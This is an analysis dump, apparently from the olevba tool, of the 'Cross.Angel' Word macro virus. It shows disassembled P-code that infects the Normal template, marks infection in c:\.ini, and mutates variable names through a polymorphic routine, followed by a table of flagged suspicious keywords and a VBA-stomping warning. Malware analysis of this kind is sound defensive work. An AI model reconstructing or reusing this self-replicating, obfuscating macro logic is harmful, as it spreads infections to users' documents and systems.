' 	Ld ´°ƒˆ� 
' 	MemLd System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld ¢Â¶¥• 
' 	Ne 
' 	IfBlock 
' Line #104:
' 	StartWithExpr 
' 	Ld ¢Â¶¥• 
' 	Ld ´°ƒˆ� 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #105:
' 	Ld ¢Â¶¥• 
' 	Ld ¢Â¶¥• 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld ˆ»¾™Š 
' 	Ne 
' 	IfBlock 
' Line #106:
' 	Ld ¢Â¶¥• 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #107:
' 	Ld ¢Â¶¥• 
' 	Ld ’¸„„„ 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #108:
' 	Ld ´°ƒˆ� 
' 	MemLd NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #109:
' 	Ld ¢Â¶¥• 
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0004 "Word"
' 	Ld ´°ƒˆ� 
' 	MemLd System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	EndWith 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	Ld ª±›¤Ã 
' 	Ld ¢Â¶¥• 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ´°ƒˆ� 
' 	ArgsMemCall Quit 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x003C 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002C "Why I lost my angel? Can't live without you!"
' 	Ld vbQuestion 
' 	LitStr 0x0020 "Cross.Angel by jackie-/Lz0NT/MVT"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' 	EndIf 
' Line #114:
' 	EndSub 
' Line #115:
' 	FuncDefn (Private Function ‚–˜¤�(’¸„„„, id_FFFE As Variant))
' 	QuoteRem 0x001E 0x0009 "JSMP v1.2"
' Line #116:
' 	Dim 
' 	LitDI2 0x0000 
' 	LitDI2 0x0014 
' 	VarDefn ª•¦°Â
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' Line #117:
' 	LitDI2 0x0001 
' 	St Â¡ÁƒŒ 
' 	BoS 0x0000 
' 	LitStr 0x0005 "’¸„„„"
' 	LitDI2 0x0000 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "‚–˜¤�"
' 	LitDI2 0x0001 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ª•¦°Â"
' 	LitDI2 0x0002 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "³žÃ­˜"
' 	LitDI2 0x0003 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "š²µ‚¤"
' 	LitDI2 0x0004 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Â¡ÁƒŒ"
' 	LitDI2 0x0005 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ˆ»¾™Š"
' 	LitDI2 0x0006 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "•Ç¤ Ÿ"
' 	LitDI2 0x0007 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "µÈÇŠ¿"
' 	LitDI2 0x0008 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "À©¸Ë¬"
' 	LitDI2 0x0009 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Ë¶ž½œ"
' 	LitDI2 0x000A 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "¯¹­®§"
' 	LitDI2 0x000B 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "¯¶˜™²"
' 	LitDI2 0x000C 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "¢Â¶¥•"
' 	LitDI2 0x000D 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "»…¨�Ž"
' 	LitDI2 0x000E 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "µ—Ê·¦"
' 	LitDI2 0x000F 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "¼Æ±¬•"
' 	LitDI2 0x0010 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "µˆ˜ˆŸ"
' 	LitDI2 0x0011 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "´°ƒˆ�"
' 	LitDI2 0x0012 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ª±›¤Ã"
' 	LitDI2 0x0013 
' 	ArgsSt ª•¦°Â 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "†�„–À"
' 	LitDI2 0x0014 
' 	ArgsSt ª•¦°Â 0x0001 
' Line #118:
' 	StartForVariable 
' 	Ld ³žÃ­˜ 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0014 
' 	For 
' Line #119:
' 	LitDI2 0x0082 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0082 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0082 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0082 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0082 
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St š²µ‚¤ 
' Line #120:
' 	Do 
' Line #121:
' 	Ld Â¡ÁƒŒ 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld ’¸„„„ 
' 	Ld ³žÃ­˜ 
' 	ArgsLd ª•¦°Â 0x0001 
' 	FnInStr3 
' 	St Â¡ÁƒŒ 
' Line #122:
' 	Ld Â¡ÁƒŒ 
' 	If 
' 	BoSImplicit 
' 	Ld ’¸„„„ 
' 	LitDI2 0x0001 
' 	Ld Â¡ÁƒŒ 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsLd Mid$ 0x0003 
' 	Ld š²µ‚¤ 
' 	Concat 
' 	Ld ’¸„„„ 
' 	Ld Â¡ÁƒŒ 
' 	Ld ³žÃ­˜ 
' 	ArgsLd ª•¦°Â 0x0001 
' 	FnLen 
' 	Add 
' 	Paren 
' 	Ld ’¸„„„ 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St ’¸„„„ 
' 	EndIf 
' Line #123:
' 	Ld Â¡ÁƒŒ 
' 	LoopWhile 
' Line #124:
' 	StartForVariable 
' 	Next 
' Line #125:
' 	Ld ’¸„„„ 
' 	St ‚–˜¤� 
' Line #126:
' 	EndFunc 
' Line #127:
' 	QuoteRem 0x0000 0x0033 "Cross.Angel written by jackie twoflower /Lz0NT /MVT"
' Line #128:
' 	QuoteRem 0x0000 0x0024 "Uses Jackie's Stupid Macro Poly v1.2"
' Line #129:
' 	QuoteRem 0x0000 0x0034 "Office97 and Office2000 compatible | New Cross area!"
' Line #130:
' 	QuoteRem 0x0000 0x002F "Hey my angel, this is for you. Why you left me?"
' Line #131:
' 	QuoteRem 0x0000 0x0023 "I can't live without you! I luv ya!"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

